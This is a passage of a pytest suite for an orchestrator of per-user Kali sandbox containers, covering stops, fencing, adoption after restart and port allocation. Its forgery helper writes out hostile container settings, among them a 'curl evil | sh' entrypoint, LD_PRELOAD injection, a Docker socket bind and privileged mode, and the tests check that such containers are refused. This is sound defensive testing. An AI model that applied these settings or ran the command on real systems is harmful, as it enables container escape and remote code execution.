    assert container.status == "exited" and container.id not in net.attrs["Containers"]
    # Still listed, still reserved: the idle loop retries the removal.
    stuck = world.mgr.get_instance(ALICE, first["instance"])
    assert stuck is not None and stuck.state == "stopping"
    assert sc.reservation_key(ALICE, first["instance"]) in world.mgr.reservation_keys()
    assert sc.reservation_key(ALICE, first["instance"]) in world.ledger.sandbox_keys()
    assert not net.removed
    world.d.fail_remove = False
    second = await world.mgr.ensure(ALICE, ["projA"])
    assert second["instance"] != first["instance"]
    targets = {m["Target"] for m in world.created(ALICE)[-1].created_kwargs["mounts"]}
    assert "/workspace/projS" not in targets


async def test_stop_all(world):
    await world.mgr.ensure(ALICE, [])
    await world.mgr.ensure(BOB, [])
    await world.mgr.ensure(BOB, [], view=sc.VIEW_ACT_AS)
    assert await world.mgr.stop_all("emergency") == 3
    assert world.created() == [] and world.ledger.sandbox_keys() == set()


async def test_reconcile_stops_instance_with_lost_project(world):
    await world.mgr.ensure(ALICE, ["projA", "projS"])
    await world.mgr.ensure(BOB, ["projS"])
    assert await world.mgr.reconcile(ALICE, ["projA", "projS"], []) == 0
    assert await world.mgr.reconcile(ALICE, ["projA"], []) == 1
    assert world.created(ALICE) == [] and len(world.created(BOB)) == 1
    with pytest.raises(sm.SandboxInvalid):
        await world.mgr.reconcile(ALICE, ["bad/id"], [])


async def test_ensure_stops_instance_mounting_a_lost_project_before_returning(world):
    first = await world.mgr.ensure(ALICE, ["projA", "projS"])
    second = await world.mgr.ensure(ALICE, ["projA"])
    assert second["instance"] != first["instance"] and second["fresh"] is True
    assert [c.name for c in world.created(ALICE)] == [second["host"]]
    assert world.mgr.reservation_keys() == {sc.reservation_key(ALICE, second["instance"])}
    targets = {m["Target"] for m in world.created(ALICE)[0].created_kwargs["mounts"]}
    assert "/workspace/projS" not in targets


@pytest.mark.parametrize("running", [True, False])
async def test_account_deleted_stop_removes_output_folder(world, running):
    keep = world.out("users", sc.sandbox_key(BOB, "own"))
    os.makedirs(keep)
    if running:
        await world.mgr.ensure(ALICE, ["projA"])
        await world.mgr.ensure(ALICE, [], view=sc.VIEW_ACT_AS)
    else:
        for view in sc.VIEWS:
            os.makedirs(world.out("users", sc.sandbox_key(ALICE, view)))
    for view in sc.VIEWS:
        with open(world.out("users", sc.sandbox_key(ALICE, view), "loot.txt"), "w") as f:
            f.write("x")
    assert await world.mgr.stop_user(ALICE, "account_deleted") == (2 if running else 0)
    for view in sc.VIEWS:
        assert not os.path.lexists(world.out("users", sc.sandbox_key(ALICE, view)))
    assert os.path.isdir(keep) and os.path.isdir(world.ws("projA")) is running


async def test_other_stop_reasons_keep_the_output_folder(world):
    await world.mgr.ensure(ALICE, [])
    await world.mgr.stop_user(ALICE, "account_disabled")
    assert os.path.isdir(world.out("users", sc.sandbox_key(ALICE, "own")))


async def test_account_deleted_unlinks_a_planted_link_and_keeps_its_target(world, tmp_path):
    target = tmp_path / "precious"
    target.mkdir()
    (target / "keep.txt").write_text("keep")
    os.makedirs(world.out("users"))
    os.symlink(str(target), world.out("users", sc.sandbox_key(ALICE, "own")))
    await world.mgr.stop_user(ALICE, "account_deleted")
    assert not os.path.lexists(world.out("users", sc.sandbox_key(ALICE, "own")))
    assert (target / "keep.txt").read_text() == "keep"


async def test_account_deleted_with_users_a_link_touches_nothing(world, tmp_path, caplog):
    target = tmp_path / "elsewhere"
    (target / sc.sandbox_key(ALICE, "own")).mkdir(parents=True)
    os.symlink(str(target), world.out("users"))
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    await world.mgr.stop_user(ALICE, "account_deleted")
    assert (target / sc.sandbox_key(ALICE, "own")).is_dir()
    assert os.path.islink(world.out("users"))


# --- A stop overtaking an ensure (fences) -----------------------------------------

async def test_account_deleted_fences_an_ensure_waiting_on_the_lock(world):
    lock = world.mgr._user_lock(ALICE)
    await lock.acquire()
    ensure = asyncio.ensure_future(world.mgr.ensure(ALICE, ["projA"]))
    await settle()
    stop = asyncio.ensure_future(world.mgr.stop_user(ALICE, "account_deleted"))
    await settle()
    lock.release()
    with pytest.raises(sm.SandboxStartError) as e:
        await ensure
    assert e.value.code == sc.ERR_START_FAILED
    await stop
    assert world.created() == [] and world.ledger.sandbox_keys() == set()
    assert not os.path.exists(world.out("users", sc.sandbox_key(ALICE, "own")))
    assert not os.path.exists(world.ws("projA"))
    # The next call (the webapp's next decision) is not fenced.
    assert (await world.mgr.ensure(ALICE, ["projA"]))["state"] == "running"


async def test_reconcile_fences_an_ensure_carrying_a_lost_project(world):
    lock = world.mgr._user_lock(ALICE)
    await lock.acquire()
    stale = asyncio.ensure_future(world.mgr.ensure(ALICE, ["projA", "projS"]))
    fine = asyncio.ensure_future(world.mgr.ensure(ALICE, ["projA"], view=sc.VIEW_ACT_AS))
    await settle()
    rec = asyncio.ensure_future(world.mgr.reconcile(ALICE, ["projA"], ["projA"]))
    await settle()
    lock.release()
    with pytest.raises(sm.SandboxStartError):
        await stale
    assert (await fine)["state"] == "running"
    await rec
    assert [c.labels[sc.LABEL_VIEW] for c in world.created(ALICE, "act_as")] == ["act_as"]
    assert world.created(ALICE, "own") == []
    # Fenced before anything was made: one create (the act_as view's), and the
    # lost project's folder was never made.
    assert len([c for c in world.d.calls if c[0] == "containers.create"]) == 1
    assert not os.path.exists(world.ws("projS"))
    assert not os.path.exists(world.out("users", sc.sandbox_key(ALICE, "own")))


async def test_stop_project_fences_only_ensures_holding_it(world):
    lock_a, lock_b = world.mgr._user_lock(ALICE), world.mgr._user_lock(BOB)
    await lock_a.acquire()
    await lock_b.acquire()
    holding = asyncio.ensure_future(world.mgr.ensure(ALICE, ["projS"]))
    other = asyncio.ensure_future(world.mgr.ensure(BOB, ["projB"]))
    await settle()
    stop = asyncio.ensure_future(world.mgr.stop_project("projS", "project_deleted"))
    await settle()
    lock_a.release()
    lock_b.release()
    with pytest.raises(sm.SandboxStartError):
        await holding
    assert (await other)["state"] == "running"
    await stop
    assert not os.path.exists(world.ws("projS"))


STOPPERS = {
    "project": lambda mgr: mgr.stop_project("projS", "project_deleted"),
    "all": lambda mgr: mgr.stop_all("emergency"),
    "user": lambda mgr: mgr.stop_user(BOB, "account_deleted"),
}


@pytest.mark.parametrize("how", sorted(STOPPERS))
async def test_a_stop_in_the_same_loop_pass_fences_the_ensure(world, how):
    # The person has no instance (as while their last one's network is removed,
    # under their lock): only the pending ensure can tell a stop about them.
    lock = world.mgr._user_lock(BOB)
    await lock.acquire()
    ensure = asyncio.ensure_future(world.mgr.ensure(BOB, ["projS"]))
    stop = asyncio.ensure_future(STOPPERS[how](world.mgr))
    await settle()
    lock.release()
    with pytest.raises(sm.SandboxStartError):
        await ensure
    assert await stop == 0
    assert world.created(BOB) == [] and world.ledger.sandbox_keys() == set()
    assert not [c for c in world.d.calls if c[0] == "containers.create"]
    assert not os.path.exists(world.ws("projS"))


async def test_fenced_replacement_leaves_the_current_instance_running(world):
    a = await world.mgr.ensure(ALICE, ["projA"])
    lock = world.mgr._user_lock(ALICE)
    await lock.acquire()
    stale = asyncio.ensure_future(world.mgr.ensure(ALICE, ["projA", "projB"], need_project="projB"))
    await settle()
    rec = asyncio.ensure_future(world.mgr.reconcile(ALICE, ["projA"], []))
    await settle()
    lock.release()
    with pytest.raises(sm.SandboxStartError):
        await stale
    assert await rec == 0
    assert [(i.instance, i.state) for i in world.mgr.instances(ALICE)] == [(a["instance"], "running")]


async def test_start_replaced_before_ready_still_wakes_its_waiters(world):
    gate = Gate()
    world.mgr = world.manager(sleep=gate.sleep)
    world.d.health_on_start = "starting"
    first = await world.mgr.ensure(ALICE, ["projA"], wait=False)
    waiter = asyncio.ensure_future(world.mgr.ensure(ALICE, ["projA"]))
    await settle()
    second = await world.mgr.ensure(ALICE, ["projA", "projB"], need_project="projB", wait=False)
    assert second["instance"] != first["instance"]
    for c in world.created(ALICE):
        c.attrs["State"]["Health"]["Status"] = "healthy"
    gate.open()
    got = await asyncio.wait_for(waiter, 5)
    assert got["instance"] == first["instance"]
    await world.mgr.join_background()
    states = {i.instance: i.state for i in world.mgr.instances(ALICE)}
    assert states == {first["instance"]: "draining", second["instance"]: "running"}


async def test_single_instance_stop_does_not_fence(world):
    a = await world.mgr.ensure(ALICE, ["projA"])
    lock = world.mgr._user_lock(ALICE)
    await lock.acquire()
    stop = asyncio.ensure_future(world.mgr.stop(ALICE, a["instance"], "idle"))
    await settle()
    ensure = asyncio.ensure_future(world.mgr.ensure(ALICE, ["projA"]))
    await settle()
    lock.release()
    await stop
    assert (await ensure)["state"] == "running"


# --- Adoption ---------------------------------------------------------------------

async def adopt_world(world):
    """Two running sandboxes started by a first manager, then a restart."""
    a = await world.mgr.ensure(ALICE, ["projA"])
    b = await world.mgr.ensure(BOB, ["projB"], view=sc.VIEW_ACT_AS)
    world.ledger.reconcile(set())          # a new process: the ledger starts empty
    world.mgr = world.manager()
    return a, b


async def test_adoption_after_restart_keeps_healthy_removes_rest(world):
    a, b = await adopt_world(world)
    # A container of another contract version, an unhealthy one, an orphan network.
    old = world.created(ALICE)[0]
    stale = world.d.containers.add(
        "redamon-kali-old", labels={**old.labels, sc.LABEL_CONTRACT: "0"})
    stale.attrs["State"]["Health"] = {"Status": "healthy"}
    sick = world.d.containers.add("redamon-kali-sick", labels=dict(old.labels))
    sick.attrs["State"]["Health"] = {"Status": "unhealthy"}
    orphan = world.d.networks.add("redamon-sbx-0000000000000000", "10.214.9.0/28",
                                  labels={**sc.network_labels(CAROL, "own"), sm.LABEL_OWNER: "redamon"})
    theirs = world.d.networks.add("redamon-sbx-1111111111111111", "10.214.9.16/28",
                                  labels={**sc.network_labels(CAROL, "own"), sm.LABEL_OWNER: "other"})
    lab = world.d.containers.add("lab")
    orphan._attach(lab, {})
    refresher = world.d.containers.add(sc.TEMPLATES_REFRESH_CONTAINER, labels=sc.templates_labels())

    result = await world.mgr.adopt()
    assert result["adopted"] == 2 and result["removed"] == 2
    assert stale.removed and sick.removed and not refresher.removed
    assert orphan.removed and ("network.disconnect", orphan.name, lab.id, True) in world.d.calls
    assert not theirs.removed
    assert world.ledger.sandbox_keys() == {sc.reservation_key(ALICE, a["instance"]),
                                           sc.reservation_key(BOB, b["instance"])}
    assert world.mgr.reservation_keys() == world.ledger.sandbox_keys()
    # The adopted instance answers with the tokens it was started with.
    again = await world.mgr.ensure(ALICE, ["projA"])
    assert again["instance"] == a["instance"] and again["token"] == a["token"]
    assert again["tunnel_token"] == a["tunnel_token"] and again["fresh"] is False
    act = await world.mgr.ensure(BOB, ["projB"], view=sc.VIEW_ACT_AS)
    assert act["instance"] == b["instance"]
    assert {i.state for i in world.mgr.instances()} == {"running"}


async def test_adoption_reattaches_a_recreated_agent(world):
    await adopt_world(world)
    world.agent.remove(force=True)
    new_agent = add_agent(world.d)
    await world.mgr.adopt()
    for name in (sc.network_name(ALICE, "own"), sc.network_name(BOB, "act_as")):
        assert connects_to(world, name)[new_agent.id] == {"Aliases": ["agent"], "GwPriority": -1000}


def _forge(world, how):
    c = world.created(ALICE)[0]
    a = c.attrs
    if how == "broker_owned":
        a["Config"]["Labels"][BROKER] = "1"
    elif how == "name":
        c.name = "redamon-kali-someone-else"
    elif how == "key_label":
        a["Config"]["Labels"][sc.LABEL_KEY] = sc.sandbox_key(BOB, "own")
    elif how == "view_label":
        a["Config"]["Labels"][sc.LABEL_VIEW] = sc.VIEW_ACT_AS
    elif how == "image":
        a["Image"] = OTHER_IMAGE_ID
    elif how == "extra_mount":
        a["HostConfig"]["Mounts"].append({"Type": "bind", "Source": "/", "Target": "/host",
                                          "ReadOnly": False})
    elif how == "binds":
        a["HostConfig"]["Binds"] = ["/var/run/docker.sock:/var/run/docker.sock"]
    elif how == "second_network":
        world.d.networks.get("redamon-network")._attach(c, {})
    elif how == "env_extra":
        a["Config"]["Env"].append("LD_PRELOAD=/tmp/x.so")
    elif how == "env_fixed_changed":
        a["Config"]["Env"] = [e if not e.startswith("REDAMON_AGENT_URL=") else
                              "REDAMON_AGENT_URL=http://evil:8080" for e in a["Config"]["Env"]]
    elif how == "image_env_changed":
        a["Config"]["Env"] = [e if not e.startswith("PATH=") else "PATH=/tmp/evil"
                              for e in a["Config"]["Env"]]
    elif how == "entrypoint":
        a["Config"]["Entrypoint"] = ["/bin/sh", "-c", "curl evil | sh"]
    elif how == "privileged":
        a["HostConfig"]["Privileged"] = True
    elif how == "caps":
        a["HostConfig"]["CapAdd"] = ["NET_ADMIN", "NET_RAW", "SYS_ADMIN"]
    elif how == "security_opt":
        a["HostConfig"]["SecurityOpt"] = ["seccomp=unconfined", "apparmor=unconfined"]
    elif how == "published_port":
        a["HostConfig"]["PortBindings"] = {"4040/tcp": [{"HostIp": "0.0.0.0", "HostPort": "4040"}]}
    elif how == "no_memory_limit":
        a["HostConfig"]["Memory"] = 0
    elif how == "pid_host":
        a["HostConfig"]["PidMode"] = "host"
    elif how == "projects_label":
        a["Config"]["Labels"][sc.LABEL_PROJECTS] = sc.projects_hash(["projZ"])
    elif how == "bad_token":
        a["Config"]["Env"] = [e if not e.startswith("MCP_AUTH_TOKEN=") else "MCP_AUTH_TOKEN=x"
                              for e in a["Config"]["Env"]]
    elif how == "stopped":
        a["State"]["Status"] = "exited"
    elif how == "unrelated_image":
        world.d.images.add(FakeImage(OTHER_IMAGE_ID, labels={"description": "not the sandbox"}))
        a["Image"] = OTHER_IMAGE_ID
    elif how == "publish_all":
        a["HostConfig"]["PublishAllPorts"] = True
    elif how == "device_cgroup_rules":
        a["HostConfig"]["DeviceCgroupRules"] = ["b *:* rwm"]
    elif how == "cgroupns_host":
        a["HostConfig"]["CgroupnsMode"] = "host"
    elif how == "runtime":
        a["HostConfig"]["Runtime"] = "custom-runtime"
    elif how == "extra_hosts":
        a["HostConfig"]["ExtraHosts"] = ["agent:10.214.9.9"]
    elif how == "nano_cpus_zero":
        a["HostConfig"]["NanoCpus"] = 0
    elif how == "cpu_shares_zero":
        a["HostConfig"]["CpuShares"] = 0
    elif how == "ipc_container":
        a["HostConfig"]["IpcMode"] = "container:abc"
    elif how == "restart_always":
        a["HostConfig"]["RestartPolicy"] = {"Name": "always"}
    elif how == "sysctls":
        a["HostConfig"]["Sysctls"] = {"net.ipv4.ip_forward": "1"}
    elif how == "tmpfs":
        a["HostConfig"]["Tmpfs"] = {"/run/x": ""}
    elif how == "dns":
        a["HostConfig"]["Dns"] = ["10.214.9.9"]
    elif how == "hostname":
        a["Config"]["Hostname"] = "agent"
    elif how == "extra_hosts_added":
        a["HostConfig"]["ExtraHosts"] = ["kali-sandbox:127.0.0.1", "agent:10.214.9.9"]
    elif how == "self_name_elsewhere":
        a["HostConfig"]["ExtraHosts"] = ["kali-sandbox:10.214.0.2"]
    elif how == "self_name_spelled_otherwise":
        a["HostConfig"]["ExtraHosts"] = ["kali-sandbox=127.0.0.1"]
    elif how == "shared_hostname_with_extra_hosts":
        a["Config"]["Hostname"] = "kali-sandbox"
    elif how == "own_hostname_without_extra_hosts":
        a["HostConfig"]["ExtraHosts"] = None
    elif how == "hostname_of_another_sandbox":
        a["Config"]["Hostname"] = sc.container_name(BOB, "own", "abcdef")
    elif how == "compose_label_not_blank":
        a["Config"]["Labels"][sc.COMPOSE_SERVICE_LABEL] = "kali-sandbox"
    elif how == "port_mismatch":
        a["Config"]["Labels"][sc.LABEL_PORT] = "47000"
        a["Config"]["Env"] = [e if not e.startswith("MSF_REVERSE_PORT=") else "MSF_REVERSE_PORT=47000"
                              for e in a["Config"]["Env"]]
        a["HostConfig"]["PortBindings"] = {"47001/tcp": [{"HostIp": "127.0.0.1", "HostPort": "47001"}]}
    else:
        raise AssertionError(how)
    return c


FORGERIES = ["broker_owned", "name", "key_label", "view_label", "image", "extra_mount", "binds",
             "second_network", "env_extra", "env_fixed_changed", "image_env_changed", "entrypoint",
             "privileged", "caps", "security_opt", "published_port", "no_memory_limit",
             "pid_host", "projects_label", "bad_token", "stopped", "unrelated_image",
             "publish_all", "device_cgroup_rules", "cgroupns_host", "runtime", "extra_hosts",
             "nano_cpus_zero", "cpu_shares_zero", "ipc_container", "restart_always", "sysctls",
             "tmpfs", "dns", "hostname", "compose_label_not_blank", "port_mismatch",
             "extra_hosts_added", "self_name_elsewhere", "self_name_spelled_otherwise",
             "shared_hostname_with_extra_hosts", "own_hostname_without_extra_hosts",
             "hostname_of_another_sandbox"]


@pytest.mark.parametrize("how", FORGERIES)
async def test_adoption_refuses_a_container_the_orchestrator_did_not_start(world, how, caplog):
    await adopt_world(world)
    forged = _forge(world, how)
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    result = await world.mgr.adopt()
    assert forged.removed and result["adopted"] == 1
    assert not any(i.user_id == ALICE for i in world.mgr.instances())
    assert all(not k.startswith(f"{sc.RESERVATION_PREFIX}{ALICE}:") for k in world.ledger.sandbox_keys())
    assert ALICE not in caplog.text


async def test_adoption_drains_a_sandbox_on_an_older_image(world):
    a, b = await adopt_world(world)
    # The daily rebuild: the tag moves to a new image; the old one stays by id.
    world.d.images.add(FakeImage(OTHER_IMAGE_ID), tag=sc.IMAGE)
    result = await world.mgr.adopt()
    assert result == {"adopted": 2, "removed": 0, "networks_removed": 0}
    assert {i.state for i in world.mgr.instances()} == {"draining"}
    assert world.ledger.sandbox_keys() == world.mgr.reservation_keys() and len(world.mgr.reservation_keys()) == 2
    # Nothing current in the view: the next ensure starts a replacement on the new image.
    again = await world.mgr.ensure(ALICE, ["projA"])
    assert again["instance"] != a["instance"] and again["fresh"] is True
    assert world.created(ALICE)[-1].attrs["Image"] == OTHER_IMAGE_ID


async def test_adoption_with_the_image_tag_missing_drains(world):
    await adopt_world(world)
    world.d.images.by_name.clear()
    result = await world.mgr.adopt()
    assert result["adopted"] == 2 and result["removed"] == 0
    assert {i.state for i in world.mgr.instances()} == {"draining"}


@pytest.mark.parametrize("extra_hosts", [None, []])
async def test_adoption_drains_a_sandbox_started_under_the_shared_hostname(world, extra_hosts):
    """Before each sandbox was named after itself, every one had the hostname
    `kali-sandbox` and no ExtraHosts. Such a sandbox is ours: kept draining (its
    sessions stay until unused; no agent code addresses `kali-sandbox` any more),
    never current, so the next start has its own name."""
    a, _ = await adopt_world(world)
    for c in world.created():
        c.attrs["Config"]["Hostname"] = "kali-sandbox"
        c.attrs["HostConfig"]["ExtraHosts"] = extra_hosts
    result = await world.mgr.adopt()
    assert result == {"adopted": 2, "removed": 0, "networks_removed": 0}
    assert {i.state for i in world.mgr.instances()} == {"draining"}
    assert {i.stop_reason for i in world.mgr.instances()} == {"replaced"}
    again = await world.mgr.ensure(ALICE, ["projA"])
    assert again["instance"] != a["instance"]
    fresh = world.created(ALICE)[-1]
    assert fresh.attrs["Config"]["Hostname"] == fresh.name == again["host"]
    assert fresh.attrs["HostConfig"]["ExtraHosts"] == ["kali-sandbox:127.0.0.1"]


@pytest.mark.parametrize("init", [None, False])
async def test_adoption_drains_a_sandbox_started_without_an_init(world, init):
    """A sandbox started before the spec ran Docker's init keeps whatever zombies
    its PID 1 never reaped: kept draining like one on an older image (its sessions
    and leases stay until unused), never current, so the next start has an init."""
    a, b = await adopt_world(world)
    for c in world.created():
        c.attrs["HostConfig"]["Init"] = init
    result = await world.mgr.adopt()
    assert result == {"adopted": 2, "removed": 0, "networks_removed": 0}
    assert {i.state for i in world.mgr.instances()} == {"draining"}
    assert {i.stop_reason for i in world.mgr.instances()} == {"replaced"}
    again = await world.mgr.ensure(ALICE, ["projA"])
    assert again["instance"] != a["instance"] and again["fresh"] is True
    assert world.created(ALICE)[-1].attrs["HostConfig"]["Init"] is True


async def test_adoption_keeps_a_sandbox_started_with_an_init_current(world):
    a, _ = await adopt_world(world)
    assert all(c.attrs["HostConfig"]["Init"] is True for c in world.created())
    await world.mgr.adopt()
    assert {i.state for i in world.mgr.instances()} == {"running"}
    assert (await world.mgr.ensure(ALICE, ["projA"]))["instance"] == a["instance"]


async def test_adoption_removes_a_broker_made_templates_look_alike(world):
    """The refresher is left to finish only when it is the orchestrator's own: a
    scan's broker can create a container with any labels, the templates role and
    this stack's owner label included, but always carries the broker's own label."""
    await adopt_world(world)
    labels = {**sc.templates_labels(), sm.LABEL_OWNER: "redamon"}
    refresher = world.d.containers.add(sc.TEMPLATES_REFRESH_CONTAINER, labels=dict(labels))
    lookalike = world.d.containers.add("templates-lookalike", labels={**labels, BROKER: "1"})
    result = await world.mgr.adopt()
    assert result["adopted"] == 2 and result["removed"] == 1
    assert lookalike.removed and not refresher.removed


async def test_a_second_stack_on_the_same_daemon_leaves_the_first_alone(world):
    a = await world.mgr.ensure(ALICE, ["projA"])
    first = world.created(ALICE)[0]
    net = world.d.networks.get(sc.network_name(ALICE, "own"))
    assert first.labels[sm.LABEL_OWNER] == "redamon" and net.attrs["Labels"][sm.LABEL_OWNER] == "redamon"
    other = world.manager(own_compose_project="redamon-test")
    assert await other.adopt() == {"adopted": 0, "removed": 0, "networks_removed": 0}
    b = await other.ensure(BOB, ["projB"])
    assert world.created(BOB)[0].labels[sm.LABEL_OWNER] == "redamon-test"
    await other.stop(BOB, b["instance"], "operator")
    assert await other.stop_all("emergency") == 0
    # The same user id in both stacks: the names collide, and the second stack
    # refuses rather than use the first one's network.
    with pytest.raises(sm.SandboxStartError):
        await other.ensure(ALICE, ["projA"])
    assert not first.removed and not net.removed and first.id in net.attrs["Containers"]
    assert (await world.mgr.ensure(ALICE, ["projA"]))["instance"] == a["instance"]


@pytest.mark.parametrize("pool_after,state", [
    ("40000-40003", "running"),
    ("0.0.0.0:40000-40003", "draining"),
    ("41000-41003", "draining"),
    (None, "draining"),
])
async def test_adoption_drains_a_sandbox_whose_pool_changed(world, pool_after, state):
    world.mp.setenv(sc.PORT_POOL_ENV, "40000-40003")
    a = await world.mgr.ensure(ALICE, [])
    assert a["reverse_port"] == 40000
    world.ledger.reconcile(set())
    if pool_after is None:
        world.mp.delenv(sc.PORT_POOL_ENV)
    else:
        world.mp.setenv(sc.PORT_POOL_ENV, pool_after)
    world.mgr = world.manager()
    result = await world.mgr.adopt()
    assert result["adopted"] == 1 and result["removed"] == 0
    assert [i.state for i in world.mgr.instances()] == [state]


async def test_adoption_on_a_cgroup_v1_daemon_accepts_its_host_cgroupns(world):
    await adopt_world(world)
    world.d.cgroup_version = "1"
    for c in world.created():
        c.attrs["HostConfig"]["CgroupnsMode"] = "host"
    assert (await world.mgr.adopt())["adopted"] == 2


async def test_adoption_keeps_the_newest_of_a_view_current(world):
    await world.mgr.ensure(ALICE, ["projA"])
    world.clock.now += 10
    newer = await world.mgr.ensure(ALICE, ["projA", "projB"], need_project="projB")
    world.ledger.reconcile(set())
    world.mgr = world.manager()
    await world.mgr.adopt()
    states = {i.instance: i.state for i in world.mgr.instances(ALICE)}
    assert states[newer["instance"]] == "running"
    assert sorted(states.values()) == ["draining", "running"]


# --- Instance ids, pool ports -----------------------------------------------------

async def test_instance_id_redrawn_on_collision_across_views(world, monkeypatch):
    draws = iter(["abc123", "abc123", "abc123", "def456"])
    monkeypatch.setattr(sm.sc, "new_instance", lambda: next(draws))
    own = await world.mgr.ensure(ALICE, [])
    act = await world.mgr.ensure(ALICE, [], view=sc.VIEW_ACT_AS)
    assert own["instance"] == "abc123" and act["instance"] == "def456"
    assert len(world.ledger.sandbox_keys()) == 2


async def test_pool_port_skips_the_sandbox_own_ports(world):
    world.mp.setenv(sc.PORT_POOL_ENV, "4040-4045")
    ans = await world.mgr.ensure(ALICE, [])
    assert ans["reverse_port"] == 4041
    c = world.created(ALICE)[0]
    assert c.created_kwargs["ports"] == {"4041/tcp": ("127.0.0.1", 4041)}
    assert env_of(c)[sc.ENV_REVERSE_PORT] == "4041" and c.labels[sc.LABEL_PORT] == "4041"


async def test_pool_of_only_sandbox_ports_publishes_nothing(world, caplog):
    world.mp.setenv(sc.PORT_POOL_ENV, "8000-8000")
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    ans = await world.mgr.ensure(ALICE, [])
    assert ans["reverse_port"] == sc.DEFAULT_REVERSE_PORT
    assert not world.created(ALICE)[0].created_kwargs.get("ports")
    assert "pool" in caplog.text


async def test_pool_never_allocates_the_default_reverse_port(world):
    # 4444 is the listener of a sandbox without a pool port: the agent reads it as
    # "nothing published", so a person drawing it would be told the same.
    world.mp.setenv(sc.PORT_POOL_ENV, "4440-4449")
    people = [f"pool-user-{n:04d}" for n in range(6)]
    answers = [await world.mgr.ensure(u, []) for u in people]
    assert [a["reverse_port"] for a in answers] == [4440, 4441, 4442, 4443, 4445, 4446]
    published = [list(c.created_kwargs["ports"]) for c in world.created()]
    assert ["4444/tcp"] not in published


async def test_a_pool_of_only_the_default_reverse_port_publishes_nothing(world, caplog):
    world.mp.setenv(sc.PORT_POOL_ENV, "4444-4444")
    caplog.set_level(logging.INFO, logger="sandbox_manager")
    ans = await world.mgr.ensure(ALICE, [])
    assert ans["state"] == "running" and ans["reverse_port"] == sc.DEFAULT_REVERSE_PORT
    c = world.created(ALICE)[0]
    assert not c.created_kwargs.get("ports") and c.labels[sc.LABEL_PORT] == ""
    assert env_of(c)[sc.ENV_REVERSE_PORT] == "4444"
    assert "pool" in caplog.text


async def test_pool_ports_unique_across_concurrent_starts(world):
    world.mp.setenv(sc.PORT_POOL_ENV, "0.0.0.0:40000-40003")
    taken = world.d.containers.add("leftover", labels={sc.LABEL_SANDBOX: "1", sc.LABEL_PORT: "40000"},
                                   status="exited")
    answers = await asyncio.gather(world.mgr.ensure(ALICE, []), world.mgr.ensure(BOB, []),
                                   world.mgr.ensure(CAROL, []))
    ports = sorted(a["reverse_port"] for a in answers)
    assert ports == [40001, 40002, 40003] and taken.labels[sc.LABEL_PORT] == "40000"
    assert world.created(ALICE)[0].created_kwargs["ports"][f"{answers[0]['reverse_port']}/tcp"][0] == "0.0.0.0"


async def test_busy_host_port_is_skipped_on_retry(world):
    world.mp.setenv(sc.PORT_POOL_ENV, "40000-40003")
    tries = []

    def busy(container):
        port = container.labels[sc.LABEL_PORT]
        tries.append(port)
        world.d.fail_start = ("Bind for 127.0.0.1:40000 failed: port is already allocated"
                              if port == "40000" else None)

    world.d.on_start.append(busy)
    ans = await world.mgr.ensure(ALICE, [])
    assert tries == ["40000", "40001"] and ans["reverse_port"] == 40001


# --- The ledger -------------------------------------------------------------------

async def test_instance_listed_while_admission_holds_the_ledger_lock(world):
    seen = []

    def mem():
        seen.append((world.ledger._lock.locked(), set(world.mgr.reservation_keys())))
        return world.host.mem

    world.ledger._mem_reader = mem
    ans = await world.mgr.ensure(ALICE, [])
    key = sc.reservation_key(ALICE, ans["instance"])
    assert seen and all(locked for locked, _ in seen)
    assert all(key in keys for _, keys in seen)


async def test_reservation_keys_cover_every_live_state(world):
    gate = Gate()
    world.mgr = world.manager(sleep=gate.sleep)
    world.d.health_on_start = "starting"
    starting = await world.mgr.ensure(ALICE, [], wait=False)
    keys = world.mgr.reservation_keys()
    assert not asyncio.iscoroutine(keys) and isinstance(keys, set)
    assert keys == {sc.reservation_key(ALICE, starting["instance"])}
    world.d.health_on_start = "healthy"
    for c in world.created():
        c.attrs["State"]["Health"]["Status"] = "healthy"
    gate.open()
    await world.mgr.join_background()
    replacement = await world.mgr.ensure(ALICE, ["projB"], need_project="projB")
    await world.mgr.ensure(BOB, [], view=sc.VIEW_ACT_AS)
    states = sorted(i.state for i in world.mgr.instances())
    assert states == ["draining", "running", "running"]
    assert len(world.mgr.reservation_keys()) == 3
    # After a restart the adopted instances are listed, draining one included.
    world.ledger.reconcile(set())
    world.mgr = world.manager()
    await world.mgr.adopt()
    keys = world.mgr.reservation_keys()
    assert all(isinstance(k, str) and k.startswith(sc.RESERVATION_PREFIX) for k in keys)
    assert keys == world.ledger.sandbox_keys() and len(keys) == 3
    assert sc.reservation_key(ALICE, replacement["instance"]) in keys
    assert sorted(i.state for i in world.mgr.instances()) == states


async def test_reaper_keeps_live_sandbox_keys(world):
    import container_manager as cm
    ans = await world.mgr.ensure(ALICE, [])
    manager = cm.ContainerManager.__new__(cm.ContainerManager)
    for attr in ("running_states", "partial_recon_states", "ai_attack_states", "gvm_states",
                 "github_hunt_states", "trufflehog_states", "supply_chain_states",
                 "codefix_sandboxes"):
        setattr(manager, attr, {})
    manager.guarddog_jobs = set()
    manager.ledger = world.ledger
    manager.extra_reservation_keys = world.mgr.reservation_keys
    world.ledger.account("full_recon:gone", GB)
    assert manager.reconcile_reservations() == 1
    assert world.ledger.sandbox_keys() == {sc.reservation_key(ALICE, ans["instance"])}


def test_ledger_prefix_matches_contract():
    assert al._SANDBOX_PREFIX == sc.RESERVATION_PREFIX
    assert al._SANDBOX_MAX_CONCURRENT_ENV == sc.MAX_CONCURRENT_ENV
    assert al._SANDBOX_ENVELOPE_KEY == sc.ENVELOPE_PROFILE_KEY
    assert al.RESOURCE_SANDBOX == sc.RESOURCE


CAP_VALUES = [None, "", "  ", "0", "1", " 2 ", "007", "999999999", "9999999999", "-0", "-1",
              "+3", "1_0", "１", "３", "٣", "1.5", "1e3", "0x3", "abc", "\t4\n"]


@pytest.mark.parametrize("raw", CAP_VALUES)
def test_max_concurrent_parsers_agree(raw, monkeypatch):
    if raw is None:
        monkeypatch.delenv(sc.MAX_CONCURRENT_ENV, raising=False)
    else:
        monkeypatch.setenv(sc.MAX_CONCURRENT_ENV, raw)
    assert ReservationLedger().max_concurrent_sandboxes() == sc.max_concurrent(raw)


# --- Logs, status, mode, validation -----------------------------------------------

async def test_start_and_stop_are_logged_without_tokens(world, caplog):
    caplog.set_level(logging.DEBUG)
    a = await world.mgr.ensure(ALICE, ["projA"])
    await world.mgr.stop(ALICE, a["instance"], "operator")
    text = caplog.text
    key = sc.sandbox_key(ALICE, "own")
    started = [r.getMessage() for r in caplog.records if "started" in r.getMessage()]
